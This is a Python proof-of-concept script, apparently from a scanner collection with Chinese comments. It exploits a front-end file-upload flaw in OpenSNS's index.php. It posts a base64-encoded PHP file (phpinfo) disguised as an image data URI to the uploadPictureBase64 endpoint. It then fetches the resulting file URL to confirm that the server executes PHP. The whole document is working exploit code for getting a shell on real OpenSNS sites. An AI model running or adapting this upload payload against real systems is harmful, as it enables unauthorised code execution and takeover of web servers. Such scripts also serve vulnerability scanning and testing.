#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: opensns index.php 前台getshell
referer: unknown
author: Lucifer
description: 文件index.php中,参数data base64解码getshell。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['opensns index.php 前台getshell','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?s=/Core/File/uploadPictureBase64.html"
        post_data = {
            "data":"data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
        }
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            pos = req.text.find("http:")
            shellurl = req.text[pos::].replace("\\","").strip('"}')
            req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req2.text:
                result[2]=  '存在'
                result[1] =  vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
